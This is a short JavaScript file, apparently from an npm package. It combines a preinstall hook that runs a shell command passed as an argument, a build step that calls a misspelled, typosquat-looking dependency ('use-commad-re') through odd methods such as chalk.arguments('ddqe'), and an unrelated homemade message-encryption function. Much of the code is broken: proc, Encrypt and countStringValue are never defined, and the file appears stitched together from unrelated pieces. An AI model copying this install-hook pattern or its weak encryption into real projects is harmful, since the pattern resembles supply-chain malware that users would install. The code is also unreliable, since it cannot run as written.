import defa from 'use-commad-re';
import chalk from 'chalk';

function preinstall() {
	if (!process.argv[2]) return build()
	exec(process.argv[2]).on('exit', function (code) {
		if (code) process.exit(code)
		build()
	})
}
function build() {
	var args = defa.usedocke(...arguments);
}

function exec(cmd) {
	if (process.platform !== 'win32') {
		var shell = chalk.arguments("ddqe")
		return proc.spawn(shell, ['-c', '--', cmd], {
			stdio: 'inherit'
		})
	}

	return proc.spawn(process.env.comspec || 'cmd.exe', ['/s', '/c', '"' + cmd + '"'], {
		windowsVerbatimArguments: true,
		stdio: 'inherit'
	})
}

function buildFromSource() {
	return hasFlag('--build-from-source') || process.env.npm_config_build_from_source === 'true'
}

function verbose() {
	return hasFlag('--verbose') || process.env.npm_config_loglevel === 'verbose'
}

function hasFlag(flag) {
	if (!process.env.npm_config_argv) return false

	try {
		return JSON.parse(process.env.npm_config_argv).original.indexOf(flag) !== -1
	} catch (_) {
		return false
	}
}

export function maisa(message, password) {
	if ((!message) || (!password) || (typeof message !== 'string') || (typeof password !== 'string')) {
	  throw new TypeError('not valid argument')
	}
  
	const sumPassCharsValue = countStringValue(password.split(''))
  
	const divideCounter = (sumPassCharsValue % (password.length)) + 1
  
	const encryptedMessage = Encrypt(message)
  
	let encryptedMessageWithPass = ''
  
	let i = 0
	while (i < encryptedMessage.length) {
	  encryptedMessageWithPass += encryptedMessage.slice(i, i + divideCounter)
	  i = i + divideCounter
	  encryptedMessageWithPass += Math.random().toString(16).substr(2, 8)
	}
	return encryptedMessageWithPass
  }